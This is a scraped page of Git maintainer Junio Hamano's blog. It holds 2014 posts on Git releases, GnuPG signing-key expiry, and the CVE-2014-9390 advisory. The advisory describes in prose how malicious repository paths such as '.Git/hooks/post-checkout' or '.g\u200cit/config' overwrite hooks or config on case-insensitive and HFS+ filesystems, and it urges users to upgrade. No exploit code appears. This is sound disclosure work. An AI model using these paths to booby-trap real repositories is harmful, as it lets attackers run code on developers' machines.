  + ►
    [February](https://git-blame.blogspot.com/2015/02/)
    (3)

* ▼
  [2014](https://git-blame.blogspot.com/2014/)
  (6)
  + ▼
    [December](https://git-blame.blogspot.com/2014/12/)
    (2)
    - [On CVE-2014-9390 and Git 2.2.1](https://git-blame.blogspot.com/2014/12/on-cve-2014-9390-and-git-221.html)
    - [Git 1.8.5.6, 1.9.5, 2.0.5, 2.1.4 and 2.2.1 and tha...](https://git-blame.blogspot.com/2014/12/git-1856-195-205-214-and-221-and.html)
  + ►
    [September](https://git-blame.blogspot.com/2014/09/)
    (1)
  + ►
    [May](https://git-blame.blogspot.com/2014/05/)
    (1)
  + ►
    [April](https://git-blame.blogspot.com/2014/04/)
    (1)
  + ►
    [March](https://git-blame.blogspot.com/2014/03/)
    (1)

* ►
  [2013](https://git-blame.blogspot.com/2013/)
  (36)
  + ►
    [November](https://git-blame.blogspot.com/2013/11/)
    (3)
  + ►
    [October](https://git-blame.blogspot.com/2013/10/)
    (1)
  + ►
    [September](https://git-blame.blogspot.com/2013/09/)
    (1)
  + ►
    [August](https://git-blame.blogspot.com/2013/08/)
    (3)
  + ►
    [July](https://git-blame.blogspot.com/2013/07/)
    (3)
  + ►
    [June](https://git-blame.blogspot.com/2013/06/)
    (5)
  + ►
    [May](https://git-blame.blogspot.com/2013/05/)
    (2)
  + ►
    [April](https://git-blame.blogspot.com/2013/04/)
    (1)
  + ►
    [March](https://git-blame.blogspot.com/2013/03/)
    (8)
  + ►
    [February](https://git-blame.blogspot.com/2013/02/)
    (7)
  + ►
    [January](https://git-blame.blogspot.com/2013/01/)
    (2)

* ►
  [2012](https://git-blame.blogspot.com/2012/)
  (58)
  + ►
    [December](https://git-blame.blogspot.com/2012/12/)
    (4)
  + ►
    [November](https://git-blame.blogspot.com/2012/11/)
    (2)
  + ►
    [October](https://git-blame.blogspot.com/2012/10/)
    (6)
  + ►
    [September](https://git-blame.blogspot.com/2012/09/)
    (3)
  + ►
    [August](https://git-blame.blogspot.com/2012/08/)
    (5)
  + ►
    [July](https://git-blame.blogspot.com/2012/07/)
    (5)
  + ►
    [June](https://git-blame.blogspot.com/2012/06/)
    (2)
  + ►
    [May](https://git-blame.blogspot.com/2012/05/)
    (2)
  + ►
    [April](https://git-blame.blogspot.com/2012/04/)
    (5)
  + ►
    [March](https://git-blame.blogspot.com/2012/03/)
    (10)
  + ►
    [February](https://git-blame.blogspot.com/2012/02/)
    (6)
  + ►
    [January](https://git-blame.blogspot.com/2012/01/)
    (8)

* ►
  [2011](https://git-blame.blogspot.com/2011/)
  (109)
  + ►
    [December](https://git-blame.blogspot.com/2011/12/)
    (8)
  + ►
    [November](https://git-blame.blogspot.com/2011/11/)
    (12)
  + ►
    [October](https://git-blame.blogspot.com/2011/10/)
    (5)
  + ►
    [September](https://git-blame.blogspot.com/2011/09/)
    (7)
  + ►
    [August](https://git-blame.blogspot.com/2011/08/)
    (3)
  + ►
    [July](https://git-blame.blogspot.com/2011/07/)
    (3)
  + ►
    [June](https://git-blame.blogspot.com/2011/06/)
    (24)
  + ►
    [May](https://git-blame.blogspot.com/2011/05/)
    (40)
  + ►
    [April](https://git-blame.blogspot.com/2011/04/)
    (7)

## Followers

|  |  |
| --- | --- |

Simple theme. Powered by [Blogger](https://www.blogger.com).



=== Content from git-blame.blogspot.com_1d7286a1_20250126_074649.html ===


# [Git Blame](https://git-blame.blogspot.com/)

Junio C Hamano aka [Gitster](https://plus.google.com/108182106411180467879?rel=author)'s Blog

## Monday, December 22, 2014

### [On CVE-2014-9390 and Git 2.2.1](https://git-blame.blogspot.com/2014/12/on-cve-2014-9390-and-git-221.html)

Now the security-fix releases are behind us, let's briefly talk about the ramifications.

The recent Git/Hg vulnerability on case-insensitive or normalizing filesystems are serious for people who fetch and integrate (either pull or pull --rebase) from untrusted sources.

When you grab a tree that records a malicious path, say, ".Git/hooks/post-checkout" using an older version of Git on such a filesystem (e.g. Windows NTFS or Mac OS X HFS+), Git will tell the filesystem to check it out at ".Git/hooks/post-checkout", but the filesystem overwrites a file different from what Git asked it to write, namely ".git/hooks/post-checkout", which is a path reserved for you to store an executable hook that is run after running "git checkout".

For an attacker to victimize you through this vector, the attacker has to have a write access to a repository you pull from. As long as you do not interact with untrustworthy strangers (e.g. only pull from the projects' official history), you will not be affected. That is often true in corporate setting, where the access to the central repository everybody in the product group uses is tightly controlled, and if an untrustworthy stranger has a write access there, you already have a bigger problem.

But the open-source is all about collaboration, and we need to meet and interact with new people every day while doing so. The prudent thing to do is to (1) update to the version of Git recently released to work around this issue, and then (2) respond to a pull request from a stranger, in this order. Don't do it the other way around!

Thanks.

Posted by

[\_](https://www.blogger.com/profile/04508668132209394366 "author profile")

at

[11:51 AM](https://git-blame.blogspot.com/2014/12/on-cve-2014-9390-and-git-221.html "permanent link")

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=632023420616344756&postID=3948751872058303537&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=632023420616344756&postID=3948751872058303537&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=632023420616344756&postID=3948751872058303537&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=632023420616344756&postID=3948751872058303537&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=632023420616344756&postID=3948751872058303537&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=632023420616344756&postID=3948751872058303537&target=pinterest "Share to Pinterest")

Labels:
[Git](https://git-blame.blogspot.com/search/label/Git)

## Thursday, December 18, 2014

### [Git 1.8.5.6, 1.9.5, 2.0.5, 2.1.4 and 2.2.1 and thanking friends in Mercurial land](https://git-blame.blogspot.com/2014/12/git-1856-195-205-214-and-221-and.html)

We have a set of urgent maintenance releases. Please update your Git if you are on Windows or Mac OS X.

Git maintains various meta-information for its repository in files in .git/ directory located at the root of the working tree. The system does not allow a file in that directory (e.g. .git/config) to be committed in the history of the project, or checked out to the working tree from the project. Otherwise, an unsuspecting user can run git pull from an innocuous-looking-but-malicious repository and have the meta-information in her repository overwritten, or executable hooks installed by the owner of that repository she pulled from (i.e. an attacker).

Unfortunately, this protection has been found to be inadequate on certain file systems:

* You can commit and checkout to .Git/*<anything>* (or any permutations of cases .[gG][iI][tT], except .git all in lowercase). But this will overwrite the corresponding .git/*<anything>* on case-insensitive file systems (e.g. Windows and Mac OS X).
* In addition, because HFS+ file system (Mac OS X) considers certain Unicode codepoints as ignorable; committing e.g. .g\u200cit/config, where U+200C is such an ignorable codepoint, and checking it out on HFS+ would overwrite .git/config because of this.

The issue is shared with other version control systems and has serious impact on affected systems (CVE-2014-9390).

Credit for discovering this issue goes to our friends in the [Mercurial](http://mercurial.selenic.com/wiki/WhatsNew#Mercurial_3.2.3_.282014-12-18.29) land (most notably, the inventor of Hg, Matt Mackall himself). The fixes to this issue for various implementations of Git (including mine, libgit2, JGit), ports using these implementations (including Git for Windows, [Visual Studio](http://blogs.msdn.com/b/bharry/archive/2014/12/18/git-vulnerability-with-git-config.aspx)) and also Mercurial have been coordinated for simultaneous releases. GitHub is running an updated version of their software that rejects trees with these confusing and problematic paths, in order to protect its users who use existing versions of Git (also see [their blog post](https://github.com/blog/1938-vulnerability-announced-update-your-git-clients)).

A huge thanks to all those who were involved.

New releases of Git for Windows, Git OSx Installer, JGit and libgit2 have been prepared to fix this issue. Microsoft (which uses libgit2 in their Visual Studio products) and Apple (which distributes a port of Git in their Xcode) both have fixes, as well.

For people building from the source, fixed versions of Git have been released as versions v1.8.5.6, v1.9.5, v2.0.5, v2.1.4, and v2.2.1 for various maintenance tracks.

Thanks.

Posted by

[\_](https://www.blogger.com/profile/04508668132209394366 "author profile")

at

[1:20 PM](https://git-blame.blogspot.com/2014/12/git-1856-195-205-214-and-221-and.html "permanent link")

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=632023420616344756&postID=4697381852008372260&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=632023420616344756&postID=4697381852008372260&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=632023420616344756&postID=4697381852008372260&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=632023420616344756&postID=4697381852008372260&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=632023420616344756&postID=4697381852008372260&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=632023420616344756&postID=4697381852008372260&target=pinterest "Share to Pinterest")

Labels:
[Announce](https://git-blame.blogspot.com/search/label/Announce),
[Git](https://git-blame.blogspot.com/search/label/Git)

## Tuesday, September 30, 2014

### [Fun (?) with GnuPG](https://git-blame.blogspot.com/2014/09/fun-with-gnupg.html)

We use GnuPG as part of the infrastructure to certify authenticity of development history in Git in various places:

* Signed tags created by git tag -s is to say "This tag was created by me, the holder of the private GnuPG key that signed this object". Because the object name of any Git object is computed as a cryptographic hash over what the object records, and because a signed tag object records the object name of a tagged object (typically a commit) and the human readable name (typically a release number or name) the tagger wants to give the tagged object, an attacker cannot forge a phony tag that points at a different commit signed with the private key the attacker does not have. You are saying "You can verify that it is true that I wanted to make that commit release X" safely because of this. Also, because the commit object records all the objects and their location in a project tree, and the parent commit objects, such a signed tag also ensures that all the development history behind such a tagged commit cannot be tampered with.
* When you merge a signed tag (either done by git merge or git pull), the content of the tag with its GnuPG signature is copied to the resulting commit object. This lets you ensure that the history behind the side branch that was merged to the history cannot be tampered with and the signature certifies that it came from the signer (typically a subsystem lieutenant).
* Signed commits created by git commit -S is a way to say "This commit was created by me", and ensures that the history behind the commit cannot be tampered with and certifies that the change it introduces came from the signer.
* Still under development is git push --signed, a way to certify that you wanted to put a particular commit at the tip of a particular branch.

GnuPG is also used as a mechanism to ensure the integrity and authenticity of tarballs that are sent to the kernel.org servers, which is a common distribution point for open source projects like the Linux kernel and Git itself. A maintainer prepares a tarball and a detached signature, uploads them, and the receiving end will verify that the signature is good.

It is a common practice to specify the expiration date when creating a signing key. For example, the [key](http://pgp.mit.edu/pks/lookup?op=vindex&search=0x20D04E5A713660A7) I have been using to sign Git release tags was originally set up to expire in 3 years since the key was created. But the thing is, a project may outlive that expiry date. An interesting question is what happens to the existing tags when the key expires.

Unluckily, the right thing happens. If the holder of the key does not do anything, the key becomes expired, and the signatures in the signed tags stops validating. Luckily, the validity of a key can be extended by the holder of the key, and once it is done, the signatures made before the key's original expiration date will continue to validate fine.

At least, that is the theory ;-)

As my key was originally set to expire early next month, I've extended the lifespan of the key 96AFE6CB I have been using a few days ago and uploaded the updated key to pgp keyservers, so existing signed tags (e.g. v2.0.0) should continue to be valid.

A few tips:

* Although [this page](https://wiki.debian.org/Subkeys) is a specific instruction to Debian contributors, it was very helpful when I had to figure out how to futz with GnuPG subkeys. It does not talk about how to update the expiration date for a subkey, though (you use "gpg --edit-key" and then choose the subkey with the "key N" command and finally use the "expire" command).
* In order to force a specific subkey to be used when signing for Git, you would need to use the ! suffix to the GnuPG key-id, e.g. in my ~/.gitconfig file:
    [user] signingkey = 96AFE6CB!
  Without the ! suffix, GnuPG tries to use the newest subkey you have associated with the same primary key, which may not be the subkey you would want to use.

I signed a new v2.1.2 maintenance release with the same key today. Hopefully it will validate OK for you (otherwise, you may have to fetch the public key from the [keyserver](http://pgp.mit.edu/pks/lookup?op=get&search=0x20D04E5A713660A7)).

Posted by

[\_](https://www.blogger.com/profile/04508668132209394366 "author profile")

at

[4:26 PM](https://git-blame.blogspot.com/2014/09/fun-with-gnupg.html "permanent link")

[No comments:](https://www.blogger.com/comment/fullpage/post/632023420616344756/1288977520839751487)

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=632023420616344756&postID=1288977520839751487&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=632023420616344756&postID=1288977520839751487&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=632023420616344756&postID=1288977520839751487&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=632023420616344756&postID=1288977520839751487&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=632023420616344756&postID=1288977520839751487&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=632023420616344756&postID=1288977520839751487&target=pinterest "Share to Pinterest")

Labels:
[Git](https://git-blame.blogspot.com/search/label/Git),
[Random Hacking](https://git-blame.blogspot.com/search/label/Random%20Hacking)

## Wednesday, May 28, 2014

### [Git 2.0](https://git-blame.blogspot.com/2014/05/git-20.html)

The real "Git 2.0" is finally out.

From the point of view of end users who are totally new to Git, this release will give them the defaults that are vastly improved compared to the older versions, but at the same time, for existing users, this release is designed to be as low-impact as possible, as long as they have been following recent releases along (instead of sticking to age-old releases like 1.7.x series). Some may even say, without remembering why it was a big deal to bring these new default behaviours to help new users, that the new release does not offer anything exciting—and that is exactly what we want to hear from existing users. In recent releases for the past year or so, we have added knobs to allow users to enable these new defaults before 2.0 happens, and added warnings to let users know when they perform an operation whose outcome will be different between 1.x series and 2.0 release. The existing users are hopefully very well prepared by now, and "Git 2.0" is designed to be the final "flipping the default" step.

We had to delay the final release by a week or so because we found a few problems  in earlier release candidates (request-pull had a regression that stopped it from showing the "tags/" prefix in "Please pull tags/frotz" when the user asked to compose a request for 'frotz' to be pulled; a code path in git-gui to support ancient versions of Git incorrectly triggered for Git 2.0), which we had to fix in an extra unplanned release candidate.

Hopefully the next cycle will become shorter, as topics that have been cooking on the 'next' branch had extra time to mature, so it all evens out in the end ;-).

Have fun.

Posted by

[\_](https://www.blogger.com/profile/04508668132209394366 "author profile")

at

[3:28 PM](https://git-blame.blogspot.com/2014/05/git-20.html "permanent link")

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=632023420616344756&postID=2805395292630278773&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=632023420616344756&postID=2805395292630278773&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=632023420616344756&postID=2805395292630278773&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=632023420616344756&postID=2805395292630278773&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=632023420616344756&postID=2805395292630278773&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=632023420616344756&postID=2805395292630278773&target=pinterest "Share to Pinterest")

Labels:
[Announce](https://git-blame.blogspot.com/search/label/Announce),
[Git](https://git-blame.blogspot.com/search/label/Git)

## Friday, April 25, 2014

### [Git 2.0 release candidate 1](https://git-blame.blogspot.com/2014/04/git-20-release-candidate-1.html)

This is the first release candidate for the upcoming Git 2.0. There are usual sort of updates and fixes one would expect to see between any two feature releases, but the primary reason why its name begins with "2" (as opposed to the last feature release whose name was "Git 1.9") is because it has a few backward incompatible changes that are all meant to improve the end-user experiences.

* People almost always push to a single place, and many people would push a single branch they are currently on. The default behaviour of "git push" (that does not say which branches to push out to where on the command line) has been updated to better support this mode of working (as opposed to working on making all branches they are going to publish ready and then push all of them in one go). The old default of pushing out all the matching branches is available by setting the push.default configuration variable to matching.
* Even though "git commit -a" can be run from any subdirectory to commit changes to all the tracked paths in the working tree, "git add -u" and "git add -A" (without specifying any path on the command line) used to operate only inside the current directory. This inconsistency bothered many people, and these commands have been updated to operate on all modified (for "-u") or all (for "-A") paths. Use "git add -u ." and "git add -A ." to restrict the command to the current directory.
* "git add *path*" is now the same as "git add -A *path*" now, so that "git add *directory/*" will notice paths you removed from the directory and record the removal.  In older versions of Git, it used to ignore removals.  You can say "git add --ignore-removal *path*" to add only added or modified paths, if you really want to.

Some of the readers may remember that we didn't give users a very good transition experience when we introduced a backward incompatible change in Git 1.6.0. We used to install all the "git-cmd"s in the same directory as "git" itself and people were used to that "git commit" and "git-commit" can be used interchangeably before that release. Then we stopped installing what does not have to be on user's $PATH at that release, which is a change that breaks people's finger-memory and existing scripts. All we did to prepare users for that change was to warn about it in release notes since Git 1.5.4 and it was apparently not enough. Many people were unhappy.

In retrospect, perhaps we could have done better by adding code to somehow detect when "git-cmd" is invoked as the top-level command and warn that such usage would break in future versions to train users to use "git cmd" form way before releasing the version that actually delivered the change.

This time around, we have been trying to be a lot more careful. For the past handful of releases, we have added extra code to detect cases where exiting versions of Git and the upcoming Git 2.0 will behave differently and to warn about the upcoming change. As the result, the actual difference between Git 1.9 and Git 2.0 is mostly "flipping the default" for these changes.

Have fun.

Posted by

[\_](https://www.blogger.com/profile/04508668132209394366 "author profile")

at

[3:50 PM](https://git-blame.blogspot.com/2014/04/git-20-release-candidate-1.html "permanent link")

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=632023420616344756&postID=6577141664877485855&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=632023420616344756&postID=6577141664877485855&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=632023420616344756&postID=6577141664877485855&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=632023420616344756&postID=6577141664877485855&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=632023420616344756&postID=6577141664877485855&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=632023420616344756&postID=6577141664877485855&target=pinterest "Share to Pinterest")

## Tuesday, March 18, 2014

### [Git 1.9.1](https://git-blame.blogspot.com/2014/03/git-191.html)

Traditionally, releases numbered with three Dewey-decimal digits were major releases that add new features, while ones with four were maintenance releases with only fixes. This was meant to give us some flexibility to say that the difference between 1.7.12 and 1.8.0 are larger than the difference between 1.8.1 and 1.8.2 (1.7.12 was the last major release in the 1.7.x series), while reserving the difference in the first digit for really big changes (i.e. 2.0 may finally toggle a switch that makes Git incompatible with older 1.x releases out of the box).

But we found out that in practice, we do not need to have three levels of changes (an incremental that changes the third digit between 1.8.1 to 1.8.2, a larger update that changes the second digit between 1.7.12 to 1.8.0, and a huge update that changes the first digit between 1.9 and 2.0). Hence the last major release was officially called "Git 1.9" when it was released on February 14, 2014.

It logically follows that, because we are dropping the third digit (or the second, depending on how you look at it) from the numbering of major releases, the first maintenance release for Git 1.9 is named with three digits, not four.

Git 1.9.1 is such a release. Among many changes we have been cooking on the development front towards the next major release, which will be called Git 2.0, this maintenance release contains only the fixes, and everybody is encouraged to upgrade to it.

Fixes since Git 1.9 are as follows:

* "git clean -d pathspec" did not use the given pathspec correctly and ended up cleaning too much.
* "git difftool" misbehaved when the repository is bound to the working tree with the ".git file" mechanism, where a textual file ".git" tells us where it is.
* "git push" did not pay attention to branch.\*.pushremote if it is defined earlier than remote.pushdefault; the order of these two variables in the configuration file should not matter, but it did by mistake.
* Codepaths that parse timestamps in commit objects have been tightened.
* "git diff --external-diff" incorrectly fed the submodule directory in the working tree to the external diff driver when it knew it is the same as one of the versions being compared.
* "git reset" needs to refresh the index when working in a working tree (it can also be used to match the index to the HEAD in an otherwise bare repository), but it failed to set up the working tree properly, causing GIT\_WORK\_TREE to be ignored.
* "git check-attr" when working on a repository with a working tree did not work well when the working tree was specified via the --work-tree (and obviously with --git-dir) option.
* "merge-recursive" was broken in 1.7.7 era and stopped working in an empty (temporary) working tree, when there are renames involved.  This has been corrected.
* "git rev-parse" was loose in rejecting command line arguments that do not make sense, e.g. "--default" without the required value for that option.
* include.path variable (or any variable that expects a path that can use ~username expansion) in the configuration file is not a boolean, but the code failed to check it.
* "git diff --quiet -- pathspec1 pathspec2" sometimes did not return correct status value.
* Attempting to deepen a shallow repository by fetching over smart HTTP transport failed in the protocol exchange, when no-done extension was used.  The fetching side waited for the list of shallow boundary commits after the sending end stopped talking to it.
* Allow "git cmd path/", when the 'path' is where a submodule is bound to the top-level working tree, to match 'path', despite the extra and unnecessary trailing slash (such a slash is often given by command line completion).

Have fun.

Posted by

[\_](https://www.blogger.com/profile/04508668132209394366 "author profile")

at

[3:14 PM](https://git-blame.blogspot.com/2014/03/git-191.html "permanent link")

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=632023420616344756&postID=4375371248974995877&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=632023420616344756&postID=4375371248974995877&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=632023420616344756&postID=4375371248974995877&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=632023420616344756&postID=4375371248974995877&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=632023420616344756&postID=4375371248974995877&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=632023420616344756&postID=4375371248974995877&target=pinterest "Share to Pinterest")

Labels:
[Announce](https://git-blame.blogspot.com/search/label/Announce),
[Git](https://git-blame.blogspot.com/search/label/Git)

[Newer Posts](https://git-blame.blogspot.com/search?updated-max=2015-06-25T13:12:00-07:00&max-results=10&reverse-paginate=true "Newer Posts")

[Older Posts](https://git-blame.blogspot.com/search?updated-max=2014-03-18T15:14:00-07:00&max-results=10 "Older Posts")

[Home](https://git-blame.blogspot.com/)

Subscribe to:
[Posts (Atom)](https://git-blame.blogspot.com/feeds/posts/default)

## Pages

* [Home](https://git-blame.blogspot.com/)
* [A Note from the Maintainer](https://git-blame.blogspot.com/p/a-note-from-maintainer.html)
* [Git Presentation Slides](https://git-blame.blogspot.com/p/git-presentation-slides.html)
* [Git Public Repositories](https://git-blame.blogspot.com/p/git-public-repositories.html)
* [Leftover Bits](https://git-blame.blogspot.com/p/leftover-bits.html)

## Links

* [Preformatted Documentation Pages](http://git-scm.com/docs/git)
* [Gifts to Gitster](http://www.amazon.com/wishlist/1513KNZE30W63)
* [Git Calendar](http://tinyurl.com/gitcal)
* [(CLOSED) gitster's (old) blog](http://gitster.livejournal.com/)

## Blog Archive

* ►
  [2016](https://git-blame.blogspot.com/2016/)
  (1)
  + ►
    [May](https://git-blame.blogspot.com/2016/05/)
    (1)

* ►
  [2015](https://git-blame.blogspot.com/2015/)
  (15)
  + ►
    [October](https://git-blame.blogspot.com/2015/10/)
    (1)
  + ►
    [July](https://git-blame.blogspot.com/2015/07/)
    (1)
  + ►
    [June](https://git-blame.blogspot.com/2015/06/)
    (3)
  + ►
    [May](https://git-blame.blogspot.com/2015/05/)
    (1)
  + ►
    [April](https://git-blame.blogspot.com/2015/04/)
    (2)
  + ►
    [March](https://git-blame.blogspot.com/2015/03/)
    (4)
  + ►
    [February](https://git-blame.blogspot.com/2015/02/)
    (3)

* ▼
  [2014](https://git-blame.blogspot.com/2014/)
  (6)
  + ▼
    [December](https://git-blame.blogspot.com/2014/12/)
    (2)
    - [On CVE-2014-9390 and Git 2.2.1](https://git-blame.blogspot.com/2014/12/on-cve-2014-9390-and-git-221.html)
    - [Git 1.8.5.6, 1.9.5, 2.0.5, 2.1.4 and 2.2.1 and tha...](https://git-blame.blogspot.com/2014/12/git-1856-195-205-214-and-221-and.html)
  + ►
    [September](https://git-blame.blogspot.com/2014/09/)
    (1)
    - [Fun (?) with GnuPG](https://git-blame.blogspot.com/2014/09/fun-with-gnupg.html)
  + ►
    [May](https://git-blame.blogspot.com/2014/05/)
    (1)
    - [Git 2.0](https://git-blame.blogspot.com/2014/05/git-20.html)
  + ►
    [April](https://git-blame.blogspot.com/2014/04/)
    (1)
    - [Git 2.0 release candidate 1](https://git-blame.blogspot.com/2014/04/git-20-release-candidate-1.html)
  + ►
    [March](https://git-blame.blogspot.com/2014/03/)
    (1)
    - [Git 1.9.1](https://git-blame.blogspot.com/2014/03/git-191.html)

* ►
  [2013](https://git-blame.blogspot.com/2013/)
  (36)
  + ►
    [November](https://git-blame.blogspot.com/2013/11/)
    (3)
  + ►
    [October](https://git-blame.blogspot.com/2013/10/)
    (1)
  + ►
    [September](https://git-blame.blogspot.com/2013/09/)
    (1)
  + ►
    [August](https://git-blame.blogspot.com/2013/08/)
    (3)
  + ►
    [July](https://git-blame.blogspot.com/2013/07/)
    (3)
  + ►
    [June](https://git-blame.blogspot.com/2013/06/)
    (5)
  + ►
    [May](https://git-blame.blogspot.com/2013/05/)
    (2)
  + ►
    [April](https://git-blame.blogspot.com/2013/04/)
    (1)
  + ►
    [March](https://git-blame.blogspot.com/2013/03/)
    (8)
  + ►
    [February](https://git-blame.blogspot.com/2013/02/)
    (7)
  + ►
    [January](https://git-blame.blogspot.com/2013/01/)
    (2)

* ►
  [2012](https://git-blame.blogspot.com/2012/)
  (58)
  + ►
    [December](https://git-blame.blogspot.com/2012/12/)
    (4)
  + ►
    [November](https://git-blame.blogspot.com/2012/11/)
    (2)
  + ►
    [October](https://git-blame.blogspot.com/2012/10/)
    (6)
  + ►
    [September](https://git-blame.blogspot.com/2012/09/)
    (3)
  + ►
    [August](https://git-blame.blogspot.com/2012/08/)
    (5)
  + ►
    [July](https://git-blame.blogspot.com/2012/07/)
    (5)
  + ►
    [June](https://git-blame.blogspot.com/2012/06/)
    (2)
  + ►
    [May](https://git-blame.blogspot.com/2012/05/)
    (2)
  + ►
    [April](https://git-blame.blogspot.com/2012/04/)
    (5)
  + ►
    [March](https://git-blame.blogspot.com/2012/03/)
    (10)
  + ►
    [February](https://git-blame.blogspot.com/2012/02/)
    (6)
  + ►
    [January](https://git-blame.blogspot.com/2012/01/)
    (8)

* ►
  [2011](https://git-blame.blogspot.com/2011/)
  (109)
  + ►
    [December](https://git-blame.blogspot.com/2011/12/)
    (8)
  + ►
    [November](https://git-blame.blogspot.com/2011/11/)
    (12)
  + ►
    [October](https://git-blame.blogspot.com/2011/10/)
    (5)
  + ►
    [September](https://git-blame.blogspot.com/2011/09/)
    (7)
  + ►
    [August](https://git-blame.blogspot.com/2011/08/)
    (3)
  + ►
    [July](https://git-blame.blogspot.com/2011/07/)
    (3)
  + ►
    [June](https://git-blame.blogspot.com/2011/06/)
    (24)
  + ►
    [May](https://git-blame.blogspot.com/2011/05/)
    (40)
  + ►
    [April](https://git-blame.blogspot.com/2011/04/)
    (7)

## Followers

|  |  |
| --- | --- |

Simple theme. Powered by [Blogger](https://www.blogger.com).


